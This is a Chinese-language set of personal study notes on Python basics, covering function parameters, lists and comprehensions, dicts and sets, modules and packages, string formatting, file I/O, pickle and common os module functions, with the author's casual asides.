<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b, /, c, d, *, e, f</span>):</span></span><br><span class="line">    print(a, b, c, d, e, f)</span><br><span class="line"></span><br><span class="line">f(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, d=<span class="number">40</span>, e=<span class="number">50</span>, f=<span class="number">60</span>) <span class="comment"># right</span></span><br><span class="line"></span><br><span class="line">f(<span class="number">10</span>, b=<span class="number">20</span>, c=<span class="number">30</span>, d=<span class="number">40</span>, e=<span class="number">50</span>, f=<span class="number">60</span>)   <span class="comment"># b 不能使用关键字参数的形式</span></span><br><span class="line">f(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, f=<span class="number">60</span>)           <span class="comment"># e 必须使用关键字参数的形式</span></span><br></pre></td></tr></table></figure>

<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><blockquote>
<p>一点点皮毛，没c++的十分之一，跟个stl库差不多，还跟刚写的有点重复</p>
</blockquote>
<h2 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h2><p>方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>.append(x)	把一个元素添加到列表的结尾，相当于 a[<span class="built_in">len</span>(a):] = [x]。</span><br><span class="line"><span class="built_in">list</span>.extend(L)	通过添加指定列表的所有元素来扩充列表，相当于 a[<span class="built_in">len</span>(a):] = L。</span><br><span class="line"><span class="built_in">list</span>.insert(i, x)	在指定位置插入一个元素。第一个参数是准备插入到其前面的那个元素的索引，例如 a.insert(<span class="number">0</span>, x) 会插入到整个列表之前，而 a.insert(<span class="built_in">len</span>(a), x) 相当于 a.append(x) 。</span><br><span class="line"><span class="built_in">list</span>.remove(x)	删除列表中值为 x 的第一个元素。如果没有这样的元素，就会返回一个错误。</span><br><span class="line"><span class="built_in">list</span>.pop([i])	从列表的指定位置移除元素，并将其返回。如果没有指定索引，a.pop()返回最后一个元素。元素随即从列表中被移除。（方法中 i 两边的方括号表示这个参数是可选的，而不是要求你输入一对方括号，你会经常在 Python 库参考手册中遇到这样的标记。）</span><br><span class="line"><span class="built_in">list</span>.clear()	移除列表中的所有项，等于<span class="keyword">del</span> a[:]。</span><br><span class="line"><span class="built_in">list</span>.index(x)	返回列表中第一个值为 x 的元素的索引。如果没有匹配的元素就会返回一个错误。</span><br><span class="line"><span class="built_in">list</span>.count(x)	返回 x 在列表中出现的次数。</span><br><span class="line"><span class="built_in">list</span>.sort()	对列表中的元素进行排序。</span><br><span class="line"><span class="built_in">list</span>.reverse()	倒排列表中的元素。</span><br><span class="line"><span class="built_in">list</span>.copy()	返回列表的浅复制，等于a[:]。</span><br></pre></td></tr></table></figure>
<blockquote>
<p>众所周知list能当stack或者queue用，挺万能的，append和pop对应push和pop</p>
</blockquote>
<h3 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h3><blockquote>
<p>在列表里写公式，挺新颖，和matlab挺像</p>
</blockquote>
<p>每个列表推导式都在 for 之后跟一个表达式，然后有零到多个 for 或 if 子句。返回结果是一个根据表达从其后的 for 和 if 上下文环境中生成出来的列表。如果希望表达式推导出一个元组，就必须使用括号。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>vec = [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">3</span>*x <span class="keyword">for</span> x <span class="keyword">in</span> vec]</span><br><span class="line">[<span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有趣</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[[x, x**<span class="number">2</span>] <span class="keyword">for</span> x <span class="keyword">in</span> vec]</span><br><span class="line">[[<span class="number">2</span>, <span class="number">4</span>], [<span class="number">4</span>, <span class="number">16</span>], [<span class="number">6</span>, <span class="number">36</span>]]</span><br><span class="line"><span class="comment"># 调用方法</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>freshfruit = [<span class="string">&#x27;  banana&#x27;</span>, <span class="string">&#x27;  loganberry &#x27;</span>, <span class="string">&#x27;passion fruit  &#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[weapon.strip() <span class="keyword">for</span> weapon <span class="keyword">in</span> freshfruit]</span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;loganberry&#x27;</span>, <span class="string">&#x27;passion fruit&#x27;</span>]</span><br><span class="line"><span class="comment"># if 过滤</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">3</span>*x <span class="keyword">for</span> x <span class="keyword">in</span> vec <span class="keyword">if</span> x &gt; <span class="number">3</span>]</span><br><span class="line">[<span class="number">12</span>, <span class="number">18</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">3</span>*x <span class="keyword">for</span> x <span class="keyword">in</span> vec <span class="keyword">if</span> x &lt; <span class="number">2</span>]</span><br><span class="line">[]</span><br><span class="line"><span class="comment"># 技巧</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>vec1 = [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>vec2 = [<span class="number">4</span>, <span class="number">3</span>, -<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x*y <span class="keyword">for</span> x <span class="keyword">in</span> vec1 <span class="keyword">for</span> y <span class="keyword">in</span> vec2]</span><br><span class="line">[<span class="number">8</span>, <span class="number">6</span>, -<span class="number">18</span>, <span class="number">16</span>, <span class="number">12</span>, -<span class="number">36</span>, <span class="number">24</span>, <span class="number">18</span>, -<span class="number">54</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x+y <span class="keyword">for</span> x <span class="keyword">in</span> vec1 <span class="keyword">for</span> y <span class="keyword">in</span> vec2]</span><br><span class="line">[<span class="number">6</span>, <span class="number">5</span>, -<span class="number">7</span>, <span class="number">8</span>, <span class="number">7</span>, -<span class="number">5</span>, <span class="number">10</span>, <span class="number">9</span>, -<span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[vec1[i]*vec2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vec1))]</span><br><span class="line">[<span class="number">8</span>, <span class="number">12</span>, -<span class="number">54</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="built_in">str</span>(<span class="built_in">round</span>(<span class="number">355</span>/<span class="number">113</span>, i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>)]</span><br><span class="line">[<span class="string">&#x27;3.1&#x27;</span>, <span class="string">&#x27;3.14&#x27;</span>, <span class="string">&#x27;3.142&#x27;</span>, <span class="string">&#x27;3.1416&#x27;</span>, <span class="string">&#x27;3.14159&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="嵌套列表解析"><a href="#嵌套列表解析" class="headerlink" title="嵌套列表解析"></a>嵌套列表解析</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 华而不实，适合ACM选手</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>matrix = [</span><br><span class="line"><span class="meta">... </span>    [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line"><span class="meta">... </span>    [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>],</span><br><span class="line"><span class="meta">... </span>    [<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>],</span><br><span class="line"><span class="meta">... </span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 矩阵转置</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[[row[i] <span class="keyword">for</span> row <span class="keyword">in</span> matrix] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">[[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>], [<span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>], [<span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>], [<span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>]]</span><br></pre></td></tr></table></figure>
<h2 id="del语句"><a href="#del语句" class="headerlink" title="del语句"></a>del语句</h2><p>使用 del 语句可以从一个列表中依索引而不是值来删除一个元素。这与使用 pop() 返回一个值不同。可以用 del 语句从列表中删除一个切割，或清空整个列表 del a[0]</p>
<h2 id="元组和序列"><a href="#元组和序列" class="headerlink" title="元组和序列"></a>元组和序列</h2><blockquote>
<p>恍然大悟，元组和广义表好像</p>
</blockquote>
<p>元组在输出时总是有括号的，以便于正确表达嵌套结构。在输入时可能有或没有括号， 不过括号通常是必须的</p>
<h2 id="集合-1"><a href="#集合-1" class="headerlink" title="集合"></a>集合</h2><blockquote>
<p>字典 集合都是大括号</p>
</blockquote>
<p>如果要创建一个空集合，你必须用 set() 而不是 {}</p>
<h2 id="字典-1"><a href="#字典-1" class="headerlink" title="字典"></a>字典</h2><blockquote>
<p>盲猜AVL树实现</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 元组构造</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>([(<span class="string">&#x27;sape&#x27;</span>, <span class="number">4139</span>), (<span class="string">&#x27;guido&#x27;</span>, <span class="number">4127</span>), (<span class="string">&#x27;jack&#x27;</span>, <span class="number">4098</span>)])</span><br><span class="line">&#123;<span class="string">&#x27;sape&#x27;</span>: <span class="number">4139</span>, <span class="string">&#x27;jack&#x27;</span>: <span class="number">4098</span>, <span class="string">&#x27;guido&#x27;</span>: <span class="number">4127</span>&#125;</span><br><span class="line"><span class="comment"># 表达式构造</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;x: x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>)&#125;</span><br><span class="line">&#123;<span class="number">2</span>: <span class="number">4</span>, <span class="number">4</span>: <span class="number">16</span>, <span class="number">6</span>: <span class="number">36</span>&#125;</span><br><span class="line"><span class="comment"># 关键字参数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>(sape=<span class="number">4139</span>, guido=<span class="number">4127</span>, jack=<span class="number">4098</span>)</span><br><span class="line">&#123;<span class="string">&#x27;sape&#x27;</span>: <span class="number">4139</span>, <span class="string">&#x27;jack&#x27;</span>: <span class="number">4098</span>, <span class="string">&#x27;guido&#x27;</span>: <span class="number">4127</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="遍历技巧"><a href="#遍历技巧" class="headerlink" title="遍历技巧"></a>遍历技巧</h2><p>在字典中遍历时，关键字和对应的值可以使用 items() 方法同时解读出来： for k, v in knights.items()</p>
<p>在序列中遍历时，索引位置和对应值可以使用 enumerate() 函数同时得到：for i, v in enumerate([‘tic’, ‘tac’, ‘toe’])</p>
<p>同时遍历两个或更多的序列，可以使用 zip() 组合：for q, a in zip(questions, answers):</p>
<p>反向遍历一个序列，首先指定这个序列，然后调用 reversed() 函数： for i in reversed(range(1, 10, 2)):</p>
<p>要按顺序遍历一个序列，使用 sorted() 函数返回一个已排序的序列，并不修改原值：for f in sorted(set(basket)):</p>
<blockquote>
<p>华而不实</p>
</blockquote>
<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>为此 Python 提供了一个办法，把这些定义存放在文件中，为一些脚本或者交互式的解释器实例使用，这个文件被称为模块。</p>
<p>模块是一个包含所有你定义的函数和变量的文件，其后缀名是.py。模块可以被别的程序引入，以使用该模块中的函数等功能。这也是使用 python 标准库的方法。</p>
<p>一个模块只会被导入一次，不管你执行了多少次import。这样可以防止导入模块被一遍又一遍地执行。</p>
<p>搜索路径是由一系列目录名组成的，Python解释器就依次从这些目录中去寻找所引入的模块。这看起来很像环境变量，事实上，也可以通过定义环境变量的方式来确定搜索路径。</p>
<p>Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中，语法如下：</p>
<pre><code>from modname import name1[, name2[, ... nameN]]
</code></pre>
<p>from … import * 语句：把一个模块的所有内容全都导入到当前的命名空间也是可行的，只需使用如下声明：</p>
<pre><code>from modname import *
</code></pre>
<p>这提供了一个简单的方法来导入一个模块中的所有项目。然而这种声明不该被过多地使用。是那些由单一下划线（_）开头的名字不在此例。大多数情况， Python程序员不使用这种方法，因为引入的其它来源的命名，很可能覆盖了已有的定义。</p>
<h2 id="name-属性"><a href="#name-属性" class="headerlink" title="__name__属性"></a>__name__属性</h2><p>一个模块被另一个程序第一次引入时，其主程序将运行。如果我们想在模块被引入时，模块中的某一程序块不执行，我们可以用__name__属性来使该程序块仅在该模块自身运行时执行。</p>
<p>每个模块都有一个__name__属性，当其值是’<strong>main</strong>‘时，表明该模块自身在运行，否则是被引入。<strong>name</strong> 与 <strong>main</strong> 底下是双下划线</p>
<h2 id="dir函数"><a href="#dir函数" class="headerlink" title="dir函数"></a>dir函数</h2><p>内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回:</p>
<p>dir(sys)</p>
<h2 id="标准模块"><a href="#标准模块" class="headerlink" title="标准模块"></a>标准模块</h2><p>有些模块直接被构建在解析器里，这些虽然不是一些语言内置的功能，但是他却能很高效的使用，甚至是系统级调用也没问题。</p>
<p>这些组件会根据不同的操作系统进行不同形式的配置，比如 winreg 这个模块就只会提供给 Windows 系统。</p>
<h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><p>包是一种管理 Python 模块命名空间的形式，采用”点模块名称”。</p>
<p>比如一个模块的名称是 A.B， 那么他表示一个包 A中的子模块 B 。</p>
<p>目录只有包含一个叫做 <strong>init</strong>.py 的文件才会被认作是一个包</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">用户可以每次只导入一个包里面的特定模块，比如:</span><br><span class="line"><span class="keyword">import</span> sound.effects.echo</span><br><span class="line">这将会导入子模块:sound.effects.echo。 他必须使用全名去访问:</span><br><span class="line">sound.effects.echo.echofilter(<span class="built_in">input</span>, output, delay=<span class="number">0.7</span>, atten=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">还有一种导入子模块的方法是:</span><br><span class="line"><span class="keyword">from</span> sound.effects <span class="keyword">import</span> echo</span><br><span class="line">这同样会导入子模块: echo，并且他不需要那些冗长的前缀，所以他可以这样使用:</span><br><span class="line">echo.echofilter(<span class="built_in">input</span>, output, delay=<span class="number">0.7</span>, atten=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">还有一种变化就是直接导入一个函数或者变量:</span><br><span class="line"><span class="keyword">from</span> sound.effects.echo <span class="keyword">import</span> echofilter</span><br><span class="line">同样的，这种方法会导入子模块: echo，并且可以直接使用他的 echofilter() 函数:</span><br><span class="line">echofilter(<span class="built_in">input</span>, output, delay=<span class="number">0.7</span>, atten=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">注意当使用 <span class="keyword">from</span> package <span class="keyword">import</span> item 这种形式的时候，对应的 item 既可以是包里面的子模块（子包），或者包里面定义的其他名称，比如函数，类或者变量。</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 语法会首先把 item 当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，抛出一个 :exc:ImportError 异常。</span><br><span class="line"></span><br><span class="line">反之，如果使用形如 <span class="keyword">import</span> item.subitem.subsubitem 这种导入形式，除了最后一项，都必须是包，而最后一项则可以是模块或者是包，但是不可以是类，函数或者变量的名字。</span><br><span class="line"></span><br><span class="line">如果包定义文件 __init__.py 存在一个叫做 __all__ 的列表变量，那么在使用 <span class="keyword">from</span> package <span class="keyword">import</span> * 的时候就把这个列表中的所有名字作为包内容导入。</span><br></pre></td></tr></table></figure>
<h1 id="io"><a href="#io" class="headerlink" title="io"></a>io</h1><h2 id="输出美化"><a href="#输出美化" class="headerlink" title="输出美化"></a>输出美化</h2><h3 id="str"><a href="#str" class="headerlink" title="str"></a>str</h3><p>str()： 函数返回一个用户易读的表达形式。</p>
<p>repr()： 产生一个解释器易读的表达形式。</p>
<p>如果你希望将输出的值转成字符串，可以使用 repr() 或 str() 函数来实现。</p>
<p>repr() 函数可以转义字符串中的特殊字符 参数可以是 Python 的任何对象</p>
<p>字符串对象的 rjust() 方法, 它可以将字符串靠右, 并在左边填充空格</p>
<h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><blockquote>
<p>看起来，very的好用，是%的升级版</p>
</blockquote>
<p>str.format() 的基本使用如下:</p>
<p>括号及其里面的字符 (称作格式化字段) 将会被 format() 中的参数替换。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">&#x27;&#123;0&#125; 和 &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line">Google 和 Runoob</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">&#x27;&#123;1&#125; 和 &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line">Runoob 和 Google</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以加参数，比如：后面的</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">&#x27;&#123;0:2d&#125; &#123;1:3d&#125; &#123;2:4d&#125;&#x27;</span>.<span class="built_in">format</span>(x, x*x, x*x*x))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果在 format() 中使用了关键字参数, 那么它们的值会指向使用该名字的参数。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">&#x27;&#123;name&#125;网址： &#123;site&#125;&#x27;</span>.<span class="built_in">format</span>(name=<span class="string">&#x27;菜鸟教程&#x27;</span>, site=<span class="string">&#x27;www.runoob.com&#x27;</span>))</span><br><span class="line">菜鸟教程网址： www.runoob.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># !a (使用 ascii()), !s (使用 str()) 和 !r (使用 repr()) 可以用于在格式化某个值之前对其进行转化:</span></span><br><span class="line">print(<span class="string">&#x27;常量 PI 的值近似为： &#123;!r&#125;。&#x27;</span>.<span class="built_in">format</span>(math.pi))</span><br><span class="line">常量 PI 的值近似为： <span class="number">3.141592653589793</span>。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选项 : 和格式标识符可以跟着字段名。 这就允许对值进行更好的格式化。 下面的例子将 Pi 保留到小数点后三位：</span></span><br><span class="line">&#123;<span class="number">0</span>:<span class="number">.3</span>f&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 : 后传入一个整数, 可以保证该域至少有这么多的宽度。 用于美化表格时很有用。</span></span><br><span class="line">&#123;<span class="number">0</span>:<span class="number">10</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最简单的就是传入一个字典, 然后使用方括号 [] 来访问键值 :</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">&#x27;Google&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Runoob&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;Taobao&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">&#x27;Runoob: &#123;0[Runoob]:d&#125;; Google: &#123;0[Google]:d&#125;; Taobao: &#123;0[Taobao]:d&#125;&#x27;</span>.<span class="built_in">format</span>(table))</span><br><span class="line">Runoob: <span class="number">2</span>; Google: <span class="number">1</span>; Taobao: <span class="number">3</span></span><br></pre></td></tr></table></figure>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>Python 提供了 input() 内置函数从标准输入读入一行文本，默认的标准输入是键盘。</p>
<pre><code>str = input(&quot;请输入：&quot;);
</code></pre>
<h2 id="文件io"><a href="#文件io" class="headerlink" title="文件io"></a>文件io</h2><p>open() 将会返回一个 file 对象，基本语法格式如下:</p>
<pre><code>open(filename, mode)
</code></pre>
<blockquote>
<p>b好像是binary二进制的意思</p>
</blockquote>
<table>
<thead>
<tr>
<th align="right">mode</th>
<th align="right">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="right">r</td>
<td align="right">只读</td>
</tr>
<tr>
<td align="right">rb</td>
<td align="right">二进制只读</td>
</tr>
<tr>
<td align="right">r+</td>
<td align="right">读写</td>
</tr>
<tr>
<td align="right">rb+</td>
<td align="right">二进制读写</td>
</tr>
<tr>
<td align="right">w</td>
<td align="right">写+初始化文件</td>
</tr>
<tr>
<td align="right">wb</td>
<td align="right">二进制写+初始化文件</td>
</tr>
<tr>
<td align="right">W+</td>
<td align="right">读写+初始化文件</td>
</tr>
<tr>
<td align="right">wb+</td>
<td align="right">二进制读写+初始化文件</td>
</tr>
<tr>
<td align="right">a</td>
<td align="right">追加 写</td>
</tr>
<tr>
<td align="right">ab</td>
<td align="right">二进制追加 写</td>
</tr>
<tr>
<td align="right">a+</td>
<td align="right">追加读写</td>
</tr>
<tr>
<td align="right">ab+</td>
<td align="right">二进制追加读写</td>
</tr>
</tbody></table>
<p>f.read() 返回字符串对象</p>
<p>为了读取一个文件的内容，调用 f.read(size), 这将读取一定数目的数据, 然后作为字符串或字节对象返回。</p>
<pre><code>str = f.read()
</code></pre>
<p>f.readline() 会从文件中读取单独的一行。换行符为 ‘\n’。f.readline() 如果返回一个空字符串, 说明已经已经读取到最后一行。</p>
<p>f.readlines() 将返回该文件中包含的所有行。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;/tmp/foo.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = f.readlines()</span><br><span class="line">print(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;Python 是一个非常好的语言。\n&#x27;</span>, <span class="string">&#x27;是的，的确非常好!!\n&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>f.write(string) 将 string 写入到文件中, 然后返回写入的字符数。</p>
<p>如果要写入一些不是字符串的东西, 那么将需要先进行转换</p>
<p>f.tell() 返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数。</p>
<p>如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数。默认为0，即文件开头</p>
<p>from_what 的值, 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾</p>
<ul>
<li>seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符</li>
<li>seek(x,1) ： 表示从当前位置往后移动x个字符</li>
<li>seek(-x,2)：表示从文件的结尾往前移动x个字符</li>
</ul>
<p>f.close()</p>
<p>当处理一个文件对象时, 使用 with 关键字是非常好的方式。在结束后, 它会帮你正确的关闭文件。 而且写起来也比 try - finally 语句块要简短:</p>
<blockquote>
<p>with这个挺新颖的，省略了close()</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/foo.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span>    read_data = f.read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h2><blockquote>
<p>序列化，恶心人的玩意</p>
</blockquote>
<p>通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储。</p>
<p>通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。</p>
<p>序列化：</p>
<pre><code>pickle.dump(obj, file, [,protocol])
</code></pre>
<p>反序列化：</p>
<pre><code>x = pickle.load(file)
</code></pre>
<p>file: 类文件对象，有read()和readline()接口。<strong>是个对象，不是文件</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用pickle模块将数据对象保存到文件</span></span><br><span class="line">data1 = &#123;<span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">2.0</span>, <span class="number">3</span>, <span class="number">4</span>+<span class="number">6j</span>],</span><br><span class="line">         <span class="string">&#x27;b&#x27;</span>: (<span class="string">&#x27;string&#x27;</span>, <span class="string">u&#x27;Unicode string&#x27;</span>),</span><br><span class="line">         <span class="string">&#x27;c&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line">selfref_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">selfref_list.append(selfref_list)</span><br><span class="line"></span><br><span class="line">output = <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Pickle dictionary using protocol 0.</span></span><br><span class="line">pickle.dump(data1, output)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Pickle the list using the highest protocol available.</span></span><br><span class="line">pickle.dump(selfref_list, output, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">output.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用pickle模块从文件中重构python对象</span></span><br><span class="line">pkl_file = <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data1 = pickle.load(pkl_file)</span><br><span class="line">pprint.pprint(data1)</span><br><span class="line"></span><br><span class="line">data2 = pickle.load(pkl_file)</span><br><span class="line">pprint.pprint(data2)</span><br><span class="line"></span><br><span class="line">pkl_file.close()</span><br></pre></td></tr></table></figure>
<h1 id="文件流"><a href="#文件流" class="headerlink" title="文件流"></a>文件流</h1><h2 id="open方法"><a href="#open方法" class="headerlink" title="open方法"></a>open方法</h2><blockquote>
<p>跟之前的有点重复</p>
</blockquote>
<p>使用 open() 方法一定要保证关闭文件对象，即调用 close() 方法。</p>
<p>open(file, mode=’r’, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None)</p>
<pre><code>file: 必需，文件路径（相对或者绝对路径）。
mode: 可选，文件打开模式
buffering: 设置缓冲
encoding: 一般使用utf8
errors: 报错级别
newline: 区分换行符
closefd: 传入的file参数类型
opener: 设置自定义开启器，开启器的返回值必须是一个打开的文件描述符。
</code></pre>
<h2 id="file对象"><a href="#file对象" class="headerlink" title="file对象"></a>file对象</h2><p>file.flush()</p>
<p>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。</p>
<p>file.fileno()</p>
<p>返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。</p>
<p>file.isatty()</p>
<p>如果文件连接到一个终端设备返回 True，否则返回 False。</p>
<p>file.read([size])</p>
<p>从文件读取指定的字节数，如果未给定或为负则读取所有。</p>
<p>file.readline([size])</p>
<p>读取整行，包括 “\n” 字符。</p>
<p>file.readlines([sizeint])</p>
<p>读取所有行并返回列表，若给定sizeint&gt;0，返回总和大约为sizeint字节的行, 实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。</p>
<p>file.seek(offset[, whence])</p>
<p>移动文件读取指针到指定位置</p>
<p>file.tell()</p>
<p>返回文件当前位置。</p>
<p>file.truncate([size])</p>
<p>从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；截断之后后面的所有字符被删除，其中 windows 系统下的换行代表2个字符大小。</p>
<p>file.write(str)</p>
<p>将字符串写入文件，返回的是写入的字符长度。</p>
<p>file.writelines(sequence)</p>
<p>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</p>
<h1 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h1><blockquote>
<p>很多方法，捡几个常用的</p>
</blockquote>
<p>os.chdir(path) 改变当前工作目录</p>
<p>os.chmod(path, mode) 更改权限 mode:stat.S_IRWXO: 其他用户有全部权限(权限掩码)0o007</p>
<p>os.listdir(path) 返回path指定的文件夹包含的文件或文件夹的名字的列表。</p>
<p>os.mkdir(path[, mode]) 以数字mode的mode创建一个名为path的文件夹.默认的 mode 是 0777 (八进制)</p>
<p>os.remove(path) 删除路径为path的文件。如果path 是一个文件夹，将抛出OSError; 查看下面的rmdir()删除一个 directory。</p>
<p>os.renames(old, new) 递归地对目录进行更名，也可以对文件进行更名。</p>
<p>os.path 模块 获取文件的属性信息。</p>
<p>os.pardir() 获取当前目录的父目录，以字符串形式显示目录名。</p>
